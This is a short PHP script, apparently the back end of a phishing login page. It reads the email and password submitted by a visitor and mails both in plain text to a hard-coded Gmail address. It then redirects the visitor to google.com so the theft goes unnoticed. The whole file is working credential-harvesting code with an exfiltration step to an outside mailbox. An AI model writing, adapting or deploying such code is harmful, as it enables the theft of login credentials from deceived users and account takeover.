<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Aquí puedes hacer lo que quieras con los datos recibidos, por ejemplo, enviar un correo electrónico
    // Configurar los detalles del correo electrónico
    $to = "kl7410246@gmail.com"; // Reemplaza esto con tu dirección de correo electrónico
    $subject = "Datos de inicio de sesión";
    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
    
    // Enviar el correo electrónico
    $headers = "From: kl7410246@gmail.com"; // Reemplaza esto con tu dirección de correo electrónico
    mail($to, $subject, $message, $headers);
    
    // Redirigir a google.com
    header("Location: https://www.google.com");
    exit();
}
?>
